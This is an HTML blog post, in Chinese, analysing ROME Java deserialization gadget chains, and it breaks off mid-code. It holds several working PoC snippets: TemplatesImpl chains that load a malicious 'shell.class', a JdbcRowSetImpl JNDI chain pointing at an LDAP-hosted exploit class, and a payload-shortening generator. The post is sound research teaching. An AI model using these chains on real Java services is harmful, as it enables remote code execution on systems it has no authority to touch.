@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\ROME反序列化 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\ROME反序列化相关安全研究与分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\ROME反序列化">
+<meta property="og:url" content="http://example.com/2025/01/07/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\ROME反序列化相关安全研究与分析">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732246562012-9a464ac4-9d03-4d5c-8d05-1a18a2910528.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732247755101-6b0fb13a-ee16-43b5-9f31-d37f0bfc4e98.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732257358599-eb039e8c-a13d-40cc-be06-6a341d12bbce.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732257329498-1b14dcb8-f9ad-477a-9442-e8f91d72da2c.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732258462928-7babc412-e6e1-49fc-baad-f090cbb3bfa6.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732258525835-9e3774ee-81c6-4728-ba81-fc3f2e1cec1e.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732259347065-54ba77d4-27c4-4883-964e-fff5446f821f.png">
+<meta property="article:published_time" content="2025-01-07T06:36:26.000Z">
+<meta property="article:modified_time" content="2025-01-07T06:36:26.837Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/683328/1732246562012-9a464ac4-9d03-4d5c-8d05-1a18a2910528.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-ROME反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/07/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
+  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\ROME反序列化
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="ROME简介"><a href="#ROME简介" class="headerlink" title="ROME简介"></a>ROME简介</h2><p>ROME是一个有用的工具库，帮助处理和操作XML格式的数据。ROME库允许我们把XML数据转换成Java中的对象，这样我们可以更方便地在程序中操作数据。另外，它也支持将Java对象转换成XML数据，这样我们就可以把数据保存成XML文件或者发送给其他系统。</p>
+<p>maven依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.0</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Rome 链也有多个变形。</p>
+<h2 id="ToStringBean"><a href="#ToStringBean" class="headerlink" title="ToStringBean"></a>ToStringBean</h2><p>一个核心类是 ToStringBean，这个类的 toString 方法会调用他封装类的全部无参 getter 方法。</p>
+<p>所以可以借助 JdbcRowSetImpl#getDatabaseMetaData() 方法触发 JNDI 注入。</p>
+<p>或者TemplatesImpl.getOutputProperties()方法触发恶意代码执行。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732246562012-9a464ac4-9d03-4d5c-8d05-1a18a2910528.png"></p>
+<p><strong>ToStringBean</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ToStringBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SomeClass.class, someInstance);</span><br></pre></td></tr></table></figure>
+
+<p>someInstance 的类型是 <code>SomeClass</code> 或其子类。</p>
+<p>toString() 方法是通过 反射调用目标类<code>SomeClass</code> 的全部无参 getter 方法 </p>
+<h1 id="（一）ObjectBean-和-EqualsBean"><a href="#（一）ObjectBean-和-EqualsBean" class="headerlink" title="（一）ObjectBean 和 EqualsBean"></a>（一）ObjectBean 和 EqualsBean</h1><h2 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(SomeClass.class, obj);</span><br></pre></td></tr></table></figure>
+
+<p><strong>EqualsBean的hashCode()方法会触发其成员变量obj的toString()方法</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732247755101-6b0fb13a-ee16-43b5-9f31-d37f0bfc4e98.png"></p>
+<h2 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a><font style="color:rgb(94, 102, 135);">ObjectBean</font></h2><p><font style="color:rgb(82, 95, 127);">在</font><code>&lt;font style=&quot;color:rgb(94, 102, 135);&quot;&gt;ObjectBean.hashcode()&lt;/font&gt;</code><font style="color:rgb(82, 95, 127);">中调用了</font><code>&lt;font style=&quot;color:rgb(94, 102, 135);&quot;&gt;EqualsBean.beanHashCode()&lt;/font&gt;</code><font style="color:rgb(82, 95, 127);">，其作用和</font><code>&lt;font style=&quot;color:rgb(94, 102, 135);&quot;&gt;EqualsBean.hashCode()&lt;/font&gt;</code><font style="color:rgb(82, 95, 127);">等价。因此可以用来替换</font><strong>EqualsBean。</strong></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732257358599-eb039e8c-a13d-40cc-be06-6a341d12bbce.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732257329498-1b14dcb8-f9ad-477a-9442-e8f91d72da2c.png"></p>
+<hr>
+<hr>
+<hr>
+<h2 id="HashMap-EqualsBean-ToStringBean-TemplatesImpl"><a href="#HashMap-EqualsBean-ToStringBean-TemplatesImpl" class="headerlink" title="HashMap+EqualsBean+ToStringBean+TemplatesImpl"></a>HashMap+EqualsBean+ToStringBean+TemplatesImpl</h2><p>Payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line"><span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\34946\\Desktop\\ROME\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line">setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"> </span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"> </span><br><span class="line"><span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"> </span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>gadget</strong></p>
+<hr>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* EqualsBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure>
+
+<h2 id="HashMap-ObjectBean-ToStringBean-TemplatesImpl"><a href="#HashMap-ObjectBean-ToStringBean-TemplatesImpl" class="headerlink" title="HashMap+ObjectBean+ToStringBean+TemplatesImpl"></a>HashMap+ObjectBean+ToStringBean+TemplatesImpl</h2><p>Poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line"><span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\34946\\Desktop\\ROME\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line">setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"> </span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"> </span><br><span class="line"><span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"> </span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(objectBean, <span class="string">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>chain</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashcode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="（二）HashMap和HashTable"><a href="#（二）HashMap和HashTable" class="headerlink" title="（二）HashMap和HashTable"></a>（二）HashMap和HashTable</h1><p>上面入口类用了HashMap去触发key的hashCode方法。</p>
+<p>HashMap可以用HashTable替换。</p>
+<p>HashTable的readObject会调用reconstitutionPut，reconstitutionPut里面调用了key.hashCode()。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732258462928-7babc412-e6e1-49fc-baad-f090cbb3bfa6.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732258525835-9e3774ee-81c6-4728-ba81-fc3f2e1cec1e.png"></p>
+<p>Poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\34946\\Desktop\\ROME\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"> </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"> </span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean,<span class="string">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="（三）BadAttributeValueExpException"><a href="#（三）BadAttributeValueExpException" class="headerlink" title="（三）BadAttributeValueExpException"></a>（三）BadAttributeValueExpException</h1><p><font style="color:rgb(50, 50, 93);">CC5的入口类也是BadAttributeValueExpException，具体可以看CC5。</font></p>
+<p><font style="color:rgb(50, 50, 93);"></font></p>
+<p><font style="color:rgb(50, 50, 93);">BadAttributeValueExpException，它的readObject方法会调用其Object类型的val成员的toString方法。要求安全管理器为空。</font></p>
+<p><font style="color:rgb(50, 50, 93);"></font></p>
+<p><font style="color:rgb(50, 50, 93);">可以直接用BadAttributeValueExpException的readObject去触发ToStringBean的toString方法。</font></p>
+<p><font style="color:rgb(50, 50, 93);">不再使用ObjectBean或者EqualsBean</font></p>
+<p><font style="color:rgb(50, 50, 93);"></font></p>
+<p><font style="color:rgb(50, 50, 93);">Poc</font></p>
+<p><font style="color:rgb(50, 50, 93);"></font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line"> <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\34946\\Desktop\\ROME\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line"> setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"> setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"> setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"> </span><br><span class="line"> <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"> </span><br><span class="line"> <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line"> </span><br><span class="line"> setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"> </span><br><span class="line">      </span><br></pre></td></tr></table></figure>
+
+<p>Gadget</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* BadAttributeValueExpException.readObject()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="（四）JdbcRowSetImpl"><a href="#（四）JdbcRowSetImpl" class="headerlink" title="（四）JdbcRowSetImpl"></a>（四）JdbcRowSetImpl</h1><p>JdbcRowSetImpl利用链是针对后半段TemplatesImpl.getOutputProperties()任意类加载进行替换的。</p>
+<p>JdbcRowSetImpl利用链的结果是能造成JNDI注入，于是下面就可以配合RMI或者LDAP服务进行攻击了。</p>
+<p>由于JDNI注入中trustURLCodebase的限制，这里限制的攻击版本为</p>
+<ul>
+<li>RMI：JDK 6u132、JDK 7u122、JDK 8u113之前</li>
+<li>LDAP：JDK 7u201、8u191、6u211、JDK 11.0.1之前</li>
+</ul>
+<p>在Fastjson反序列化漏洞中能造成JNDI注入的同样是JdbcRowSetImpl这条链。问题出在JdbcRowSetImpl.getDatabaseMetaData()这个getter上</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732259347065-54ba77d4-27c4-4883-964e-fff5446f821f.png"></p>
+<p>connect函数会调用lookup()，触发了JNDI接口调用。</p>
+<p>lookup()内的值由dataSource属性控制。</p>
+<p>Poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">#EXP为我们的恶意类</span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:9999/EXP&quot;</span>;</span><br><span class="line">jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line"><span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h1 id="（五）HashMap利用链优化"><a href="#（五）HashMap利用链优化" class="headerlink" title="（五）HashMap利用链优化"></a>（五）HashMap利用链优化</h1><p>hashMap在put时也会调用一次key的hashCode，为了避免在生成poc时本地执行命令，可以选择反射修改HashMap的key值。</p>
+<p>不过值得注意的是，根据HashMap的实现原理，key-value实际上是存储于它的内部类Node&lt;K,V&gt;中的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//HashMap大小设置为1</span></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//先存入无关数据</span></span><br><span class="line">hashMap.put(<span class="string">&quot;aaa&quot;</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射获取属性值table</span></span><br><span class="line">Object[] tables= (Object[]) getValue(hashMap,<span class="string">&quot;table&quot;</span>);</span><br><span class="line"><span class="comment">//获取第一个Node</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">new_tables</span> <span class="operator">=</span> tables[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//反射修改Node中的key值</span></span><br><span class="line">setValue(new_tables,<span class="string">&quot;key&quot;</span>,equalsBean);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>也可以使用marshalsec工具中的JDKUtil#makeMap来手动生成一个HashMap。这里v1和v2分别为key和value。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="（六）Payload缩短"><a href="#（六）Payload缩短" class="headerlink" title="（六）Payload缩短"></a>（六）Payload缩短</h1><p>AbstractTranslet由于我们的恶意类也就是TemplatesImpl加载的子类需要继承AbstractTranslet类，并重写两个transform()方法。否则编译无法通过，无法生成.class文件。</p>
+<p>但是该恶意类在执行过程中并没有用到重写的方法，所以我们可以直接使用Javassist从字节码层面来生成恶意class，跳过恶意类的编译过程。</p>
+<p>Gedgat的调用流程中，仍有一些细节可以优化，比如</p>
+<ul>
+<li>TemplatesImpl._name的长度可以为1</li>
+<li>TemplatesImpl._tfactory可以不用赋值</li>
+<li>HashMap的value长度可以为1</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Shell;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetShellByteCodes</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd)&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span 